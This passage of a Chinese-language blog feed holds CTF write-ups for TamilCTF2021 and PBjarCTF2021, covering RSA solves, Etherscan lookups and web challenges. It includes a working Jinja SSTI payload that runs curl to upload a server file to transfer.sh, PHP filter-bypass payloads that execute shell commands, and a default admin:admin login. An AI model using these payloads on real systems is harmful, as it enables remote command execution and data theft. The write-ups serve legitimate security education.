alt=\"image-20211119203608270\" style=\"zoom:70%;\" /></p>\n<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>\n<pre><code class=\"python\">&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()&#125;&#125;\n</code></pre>\n<p><img data-src=\"/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png\" alt=\"image-20211119212248483\"></p>\n<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href=\"http://transfer.sh/\">transfer.sh</a></p>\n<pre><code class=\"python\">&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;\n</code></pre>\n<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src=\"/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png\" alt=\"image-20211119204635015\"></p>\n<img data-src=\"../../CTF/TamilCTF2021/Web/images/flag.jpg\" alt=\"Open Flag\" style=\"zoom:80%;\" />\n\n<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"Open Flag 访问题目中给出的链接,发现是一个登录页面随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是./flag.jpg.F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可 使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记&lt;!--,找到os._wrap_close模块所在的索引为132,借助于popen函数可以直接执行系统命令 &#123;&#123;\"\".__class__.__bases__[0].__subclasses__()&#125;&#125; 使用curl命令将flag.jpg文件上传至transfer.sh &#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125; 在HTML注释中找到文件上传后的URLhttp://transfer.sh/bDGBlw/flag.jpg flag:TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;","summary":"Open Flag 访问题目中给出的链接,发现是一个登录页面随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是./flag.jpg.F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可 使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记&lt;!--,找到os._wrap_close模块所在的索引为132,借助于popen函数可以直接执行系统命令 &#123;&#123;\"\".__class__.__bases__[0].__subclasses__()&#125;&#125; 使用curl命令将flag.jpg文件上传至transfer.sh &#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125; 在HTML注释中找到文件上传后的URLhttp://transfer.sh/bDGBlw/flag.jpg flag:TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;","date_published":"2021-09-29T07:05:34.000Z","tags":["CTF","CTF","TamilCTF"]},{"id":"https://zhaoqi.vip/posts/2720124286/","url":"https://zhaoqi.vip/posts/2720124286/","title":"PBjarCTF2021 Writeup","content_html":"<h1 id=\"Convert\"><a href=\"#Convert\" class=\"headerlink\" title=\"Convert\"></a>Convert</h1><p><em>So this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don’t know how to do this, Google is your best friend!!!</em></p>\n<hr>\n<p>给了一个文件<code>file.txt</code>,里面是一个16进制的数:</p>\n<pre><code class=\"python\">n = &#39;666c61677b6469735f69735f615f666c346767675f68317d&#39;\nfor i in range(0,len(n),2):\n    print(chr(int(n[i:i+2],16)),end=&#39;&#39;)\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;dis_is_a_fl4ggg_h1&#125;</code></p>\n<h1 id=\"Not-Baby\"><a href=\"#Not-Baby\" class=\"headerlink\" title=\"Not_Baby\"></a>Not_Baby</h1><p><em>Hmm…. What is this?</em></p>\n<hr>\n<pre><code class=\"python\">from Crypto.Util.number import *\nwith open(&#39;flag.txt&#39;, &#39;rb&#39;) as g:\n    flag = g.read().strip()\n\nwith open(&#39;nums.txt&#39;, &#39;r&#39;) as f:\n    s = f.read().strip().split()\n    a = int(s[0])\n    b = int(s[1])\n    c = int(s[2])\n\ne = 65537\nn = a**3+b**3-34*c**3\nm = bytes_to_long(flag)\nct = pow(m, e, n)\n\nprint(&quot;n: &quot;, n)\nprint(&quot;e: &quot;, e)\nprint(&quot;ct: &quot;, ct)\n</code></pre>\n<p>在<a href=\"http://factordb.com/\">factordb.com</a>上分解n,得到</p>\n<pre><code class=\"python\">n = 2^2 · 73 · 181 · 11411 · 235111 · 6546828737292350227122068012441477&lt;34&gt; · 61872434969046837223597248696590986360784288448775988338706090668799371&lt;71&gt;\n</code></pre>\n<p>继续尝试在<a href=\"http://factordb.com/\">factordb.com</a>上分解后两个数,发现二者均为素数</p>\n<p>选择两个以上的素数相乘得到n时,公钥、私钥、加解密与一般 RSA 相同。</p>\n<p><code>φ(n)=(p1−1)(p2−1)(p3−1)...</code></p>\n<p><strong>exp</strong></p>\n<pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import long2str\nn = 57436275279999211772332390260389123467061581271245121044959385707165571981686310741298519009630482399016808156120999964\ne = 65537\nct = 25287942932936198887822866306739577372124406139134641253461396979278534624726135258660588590323101498005293149770225633\n\nls = [2, 2, 73, 181, 11411, 235111, 6546828737292350227122068012441477, 61872434969046837223597248696590986360784288448775988338706090668799371]\n\nphi = 1\nfor x in ls:\n    phi *= (x-1)\n\nd = gmpy2.invert(e, phi)\nx = pow(ct, d, n)\nprint(long2str(x))\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;f4ct0ring_s0000oo00000o00_h4rd&#125;</code></p>\n<h1 id=\"ReallynotSecureAlgorithm\"><a href=\"#ReallynotSecureAlgorithm\" class=\"headerlink\" title=\"ReallynotSecureAlgorithm\"></a>ReallynotSecureAlgorithm</h1><p><em>Here’s the obligatory problem!!!</em></p>\n<hr>\n<p>题目给了p,q,e,c的值,直接求d解密即可</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nwith open(&#39;flag.txt&#39;,&#39;rb&#39;) as f:\n    flag = f.read().strip()\ne=65537\np=getPrime(128)\nq=getPrime(128)\nn=p*q\nm=bytes_to_long(flag)\nct=pow(m,e,n)\n\nprint (p)\nprint (q)\nprint (e)\nprint (ct)\n</code></pre>\n<p>代码:</p>\n<pre><code class=\"python\">from Crypto.Util.number import long2str\nimport gmpy2\n\np = 194522226411154500868209046072773892801\nq = 288543888189520095825105581859098503663\ne = 65537\nc = 2680665419605434578386620658057993903866911471752759293737529277281335077856\n\nn = p*q\nphi = (p-1) * (q-1)\nd = gmpy2.invert(e,phi)\nx = pow(c,d,n)\nprint(long2str(x))\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;n0t_to0_h4rd_rIt3_19290453&#125;</code></p>\n<h1 id=\"TechLead\"><a href=\"#TechLead\" class=\"headerlink\" title=\"TechLead\"></a><strong>TechLead</strong></h1><p><em>Infamous YouTuber, and ex-Google &#x2F; ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address? Million Token: <a href=\"https://coinmarketcap.com/currencies/million/\">https://coinmarketcap.com/currencies/million/</a> Flag format: flag{0.006942069420}</em></p>\n<hr>\n<p>访问题目中给出的链接，点击<code>Explores</code>-&gt;<code>Etherscan.io</code>,<a href=\"https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611#balances\">https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611</a></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/TechLead-0.png\" alt=\"TechLead\"></p>\n<p>点击<code>Holders</code>,找到<code>TechLead </code>的<code>address</code>,0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/TechLead-1.png\" alt=\"TechLead\"></p>\n<p>访问<a href=\"https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4#analytics\">https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</a>,点击<code>analytics</code></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/TechLead-2.png\" alt=\"TechLead-2\"></p>\n<p><strong>flag:</strong><code>flag&#123;1.4625790953780384&#125;</code></p>\n<h1 id=\"miner\"><a href=\"#miner\" class=\"headerlink\" title=\"miner\"></a><strong>miner</strong></h1><p><em>Block #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block?</em></p>\n<hr>\n<p><a href=\"https://etherscan.io/block/11834380\">https://etherscan.io/block/11834380</a></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/miner.png\" alt=\"miner\"></p>\n<p><strong>flag:</strong><code>flag&#123;0xd224ca0c819e8e97ba0136b3b95ceff503b79f53&#125;</code></p>\n<h1 id=\"readFlag1\"><a href=\"#readFlag1\" class=\"headerlink\" title=\"readFlag1\"></a>readFlag1</h1><p><em>The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan. Important: This smart contract is on Ropsten</em></p>\n<hr>\n<p><a href=\"https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD#code\">https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD</a></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/readFlag1.png\" alt=\"readFlag1\"></p>\n<p><strong>flag:</strong><code>flag&#123;etherscan_S0urc3_c0de&#125;</code></p>\n<h1 id=\"readFlag2\"><a href=\"#readFlag2\" class=\"headerlink\" title=\"readFlag2\"></a>readFlag2</h1><p><em>I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to “get()” the flag. Important: This smart contract is on Ropsten</em></p>\n<hr>\n<p><a href=\"https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866#internaltx\">https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866</a></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/readFlag2-0.png\" alt=\"assets/readFlag2-0.png\"></p>\n<p>点击Internal Texs,访问第一个<code>Contract</code></p>\n<p><a href=\"https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151#code\">https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151</a></p>\n<p>点击<code>Read Contract</code></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/readFlag2.png\" alt=\"readFlag2\"></p>\n<p><strong>flag:</strong><code>flag&#123;web3js_plus_ABI_equalls_flag&#125; </code></p>\n<h1 id=\"readFlag3\"><a href=\"#readFlag3\" class=\"headerlink\" title=\"readFlag3\"></a>readFlag3</h1><p><em>0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A. Important: This smart contract is on Ropsten</em></p>\n<hr>\n<p><a href=\"https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code\">https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code</a></p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Misc/assets/readFlag3.png\" alt=\"image-20210923154202557\"></p>\n<p><strong>flag:</strong><code>flag&#123;s3t_by_c0nstructor&#125;</code></p>\n<h1 id=\"ProgrammersHateProgramming\"><a href=\"#ProgrammersHateProgramming\" class=\"headerlink\" title=\"ProgrammersHateProgramming\"></a>ProgrammersHateProgramming</h1><p><em>just a little different than normally. Link: <a href=\"http://147.182.172.217:42002/index.php\">http://147.182.172.217:42002/index.php</a></em></p>\n<hr>\n<pre><code class=\"php\">&lt;?php\nif(isset($_POST[&quot;notewrite&quot;]))\n&#123;\n    $newnote = $_POST[&quot;notewrite&quot;];\n    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);\n    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace_first(&quot;&lt;script&gt;&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace_first(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);\n\n    $filename = generateRandomString();\n    file_put_contents(&quot;$filename.php&quot;, $notetoadd);\n    header(&quot;location:index.php&quot;);\n&#125;\n</code></pre>\n<p><strong>payload</strong></p>\n<pre><code class=\"php\">&lt;?php&lt;?php\n echo `cat /flagflag.php`;\n?&gt;?&gt;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we&#39;re_developing_a_really_meaningful_connection&#125;</code></p>\n<h1 id=\"ProgrammersHateProgramming-2\"><a href=\"#ProgrammersHateProgramming-2\" class=\"headerlink\" title=\"ProgrammersHateProgramming 2\"></a>ProgrammersHateProgramming 2</h1><p><em>oh noes now there are more filters :(( Link: <a href=\"http://147.182.172.217:42007/\">http://147.182.172.217:42007/</a></em></p>\n<hr>\n<pre><code class=\"php\">&lt;?php\nif(isset($_POST[&quot;notewrite&quot;]))\n&#123;\n    $newnote = $_POST[&quot;notewrite&quot;];\n    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);\n    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace_first(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);\n\n    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;ls&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;ZeroDayTea is not hot&quot;, &quot;&quot;, $notetoadd);\n\n    $filename = generateRandomString();\n    file_put_contents(&quot;$filename.php&quot;, $notetoadd);\n    header(&quot;location:index.php&quot;);\n&#125;\n?&gt;\n</code></pre>\n<p><strong>payload</strong></p>\n<pre><code class=\"php\">&lt;?php&lt;?&lt;?php\n echo `sort /flagflag.php`;\n?&gt;?&gt;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)&#125;</code></p>\n<h1 id=\"cOrL\"><a href=\"#cOrL\" class=\"headerlink\" title=\"cOrL\"></a>cOrL</h1><p><em>Descriptions are hard give me a break. (Think of common usernames and passwords for admin) Link: <a href=\"http://147.182.172.217:42003/\">http://147.182.172.217:42003/</a></em></p>\n<hr>\n<p>访问题目给出的链接，是一个简单的登录表单。用<code>admin:admin</code>登录</p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Web/assets/corl2.png\" alt=\"cOrL\"></p>\n<p>使用Burp Suitel拦截请求，将HTTP请求方式修改为<code>Put</code>即可:</p>\n<p><img data-src=\"/../../CTF/PBjarCTF2021/Web/assets/corl20-flag.png\" alt=\"image-20210923170425418\"></p>\n<p><strong>flag:</strong><code>flag&#123;HTTP_r3qu35t_m3th0d5_ftw&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"ConvertSo this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don’t know how to do this, Google is your best friend!!! 给了一个文件file.txt,里面是一个16进制的数: n = &#39;666c61677b6469735f69735f615f666c346767675f68317d&#39; for i in range(0,len(n),2): print(chr(int(n[i:i+2],16)),end=&#39;&#39;) flag:flag&#123;dis_is_a_fl4ggg_h1&#125; Not_BabyHmm…. What is this? from Crypto.Util.number import * with open(&#39;flag.txt&#39;, &#39;rb&#39;) as g: flag = g.read().strip() with open(&#39;nums.txt&#39;, &#39;r&#39;) as f: s = f.read().strip().split() a = int(s[0]) b = int(s[1]) c = int(s[2]) e = 65537 n = a**3+b**3-34*c**3 m = bytes_to_long(flag) ct = pow(m, e, n) print(&quot;n: &quot;, n) print(&quot;e: &quot;, e) print(&quot;ct: &quot;, ct) 在factordb.com上分解n,得到 n = 2^2 · 73 · 181 · 11411 · 235111 · 6546828737292350227122068012441477&lt;34&gt; · 61872434969046837223597248696590986360784288448775988338706090668799371&lt;71&gt; 继续尝试在factordb.com上分解后两个数,发现二者均为素数 选择两个以上的素数相乘得到n时,公钥、私钥、加解密与一般 RSA 相同。 φ(n)=(p1−1)(p2−1)(p3−1)... exp import gmpy2 from Crypto.Util.number import long2str n = 57436275279999211772332390260389123467061581271245121044959385707165571981686310741298519009630482399016808156120999964 e = 65537 ct = 25287942932936198887822866306739577372124406139134641253461396979278534624726135258660588590323101498005293149770225633 ls = [2, 2, 73, 181, 11411, 235111, 6546828737292350227122068012441477, 61872434969046837223597248696590986360784288448775988338706090668799371] phi = 1 for x in ls: phi *= (x-1) d = gmpy2.invert(e, phi) x = pow(ct, d, n) print(long2str(x)) flag:flag&#123;f4ct0ring_s0000oo00000o00_h4rd&#125; ReallynotSecureAlgorithmHere’s the obligatory problem!!! 题目给了p,q,e,c的值,直接求d解密即可 from Crypto.Util.number import * with open(&#39;flag.txt&#39;,&#39;rb&#39;) as f: flag = f.read().strip() e=65537 p=getPrime(128) q=getPrime(128) n=p*q m=bytes_to_long(flag) ct=pow(m,e,n) print (p) print (q) print (e) print (ct) 代码: from Crypto.Util.number import long2str import gmpy2 p = 194522226411154500868209046072773892801 q = 288543888189520095825105581859098503663 e = 65537 c = 2680665419605434578386620658057993903866911471752759293737529277281335077856 n = p*q phi = (p-1) * (q-1) d = gmpy2.invert(e,phi) x = pow(c,d,n) print(long2str(x)) flag:flag&#123;n0t_to0_h4rd_rIt3_19290453&#125; TechLeadInfamous YouTuber, and ex-Google &#x2F; ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address? Million Token: https://coinmarketcap.com/currencies/million/ Flag format: flag{0.006942069420} 访问题目中给出的链接，点击Explores-&gt;Etherscan.io,https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611 点击Holders,找到TechLead 的address,0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4 访问https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4,点击analytics flag:flag&#123;1.4625790953780384&#125; minerBlock #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block? https://etherscan.io/block/11834380 flag:flag&#123;0xd224ca0c819e8e97ba0136b3b95ceff503b79f53&#125; readFlag1The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD flag:flag&#123;etherscan_S0urc3_c0de&#125; readFlag2I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to “get()” the flag. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866 点击Internal Texs,访问第一个Contract https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151 点击Read Contract flag:flag&#123;web3js_plus_ABI_equalls_flag&#125; readFlag30xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code flag:flag&#123;s3t_by_c0nstructor&#125; ProgrammersHateProgrammingjust a little different than normally. Link: http://147.182.172.217:42002/index.php &lt;?php if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote); $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;script&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd); $filename = generateRandomString(); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; payload &lt;?php&lt;?php echo `cat /flagflag.php`; ?&gt;?&gt; flag:flag&#123;server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we&#39;re_developing_a_really_meaningful_connection&#125; ProgrammersHateProgramming 2oh noes now there are more filters :(( Link: http://147.182.172.217:42007/ &lt;?php if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote); $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;ls&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;ZeroDayTea is not hot&quot;, &quot;&quot;, $notetoadd); $filename = generateRandomString(); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; ?&gt; payload &lt;?php&lt;?&lt;?php echo `sort /flagflag.php`; ?&gt;?&gt; flag:flag&#123;wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)&#125; cOrLDescriptions are hard give me a break. (Think of common usernames and passwords for admin) Link: http://147.182.172.217:42003/ 访问题目给出的链接，是一个简单的登录表单。用admin:admin登录 使用Burp Suitel拦截请求，将HTTP请求方式修改为Put即可: flag:flag&#123;HTTP_r3qu35t_m3th0d5_ftw&#125;","summary":"ConvertSo this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don’t know how to do this, Google is your best friend!!! 给了一个文件file.txt,里面是一个16进制的数: n = &#39;666c61677b6469735f69735f615f666c346767675f68317d&#39; for i in range(0,len(n),2): print(chr(int(n[i:i+2],16)),end=&#39;&#39;) flag:flag&#123;dis_is_a_fl4ggg_h1&#125; Not_BabyHmm…. What is this? from Crypto.Util.number import * with open(&#39;flag.txt&#39;, &#39;rb&#39;) as g: flag = g.read().strip() with open(&#39;nums.txt&#39;, &#39;r&#39;) as f: s = f.read().strip().split() a = int(s[0]) b = int(s[1]) c = int(s[2]) e = 65537 n = a**3+b**3-34*c**3 m = bytes_to_long(flag) ct = pow(m, e, n) print(&quot;n: &quot;, n) print(&quot;e: &quot;, e) print(&quot;ct: &quot;, ct) 在factordb.com上分解n,得到 n = 2^2 · 73 · 181 · 11411 · 235111 · 6546828737292350227122068012441477&lt;34&gt; · 61872434969046837223597248696590986360784288448775988338706090668799371&lt;71&gt; 继续尝试在factordb.com上分解后两个数,发现二者均为素数 选择两个以上的素数相乘得到n时,公钥、私钥、加解密与一般 RSA 相同。 φ(n)=(p1−1)(p2−1)(p3−1)... exp import gmpy2 from Crypto.Util.number import long2str n = 57436275279999211772332390260389123467061581271245121044959385707165571981686310741298519009630482399016808156120999964 e = 65537 ct = 25287942932936198887822866306739577372124406139134641253461396979278534624726135258660588590323101498005293149770225633 ls = [2, 2, 73, 181, 11411, 235111, 6546828737292350227122068012441477, 61872434969046837223597248696590986360784288448775988338706090668799371] phi = 1 for x in ls: phi *= (x-1) d = gmpy2.invert(e, phi) x = pow(ct, d, n) print(long2str(x)) flag:flag&#123;f4ct0ring_s0000oo00000o00_h4rd&#125; ReallynotSecureAlgorithmHere’s the obligatory problem!!! 题目给了p,q,e,c的值,直接求d解密即可 from Crypto.Util.number import * with open(&#39;flag.txt&#39;,&#39;rb&#39;) as f: flag = f.read().strip() e=65537 p=getPrime(128) q=getPrime(128) n=p*q m=bytes_to_long(flag) ct=pow(m,e,n) print (p) print (q) print (e) print (ct) 代码: from Crypto.Util.number import long2str import gmpy2 p = 194522226411154500868209046072773892801 q = 288543888189520095825105581859098503663 e = 65537 c = 2680665419605434578386620658057993903866911471752759293737529277281335077856 n = p*q phi = (p-1) * (q-1) d = gmpy2.invert(e,phi) x = pow(c,d,n) print(long2str(x)) flag:flag&#123;n0t_to0_h4rd_rIt3_19290453&#125; TechLeadInfamous YouTuber, and ex-Google &#x2F; ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address? Million Token: https://coinmarketcap.com/currencies/million/ Flag format: flag{0.006942069420} 访问题目中给出的链接，点击Explores-&gt;Etherscan.io,https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611 点击Holders,找到TechLead 的address,0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4 访问https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4,点击analytics flag:flag&#123;1.4625790953780384&#125; minerBlock #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block? https://etherscan.io/block/11834380 flag:flag&#123;0xd224ca0c819e8e97ba0136b3b95ceff503b79f53&#125; readFlag1The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD flag:flag&#123;etherscan_S0urc3_c0de&#125; readFlag2I have republished the previous the contract at 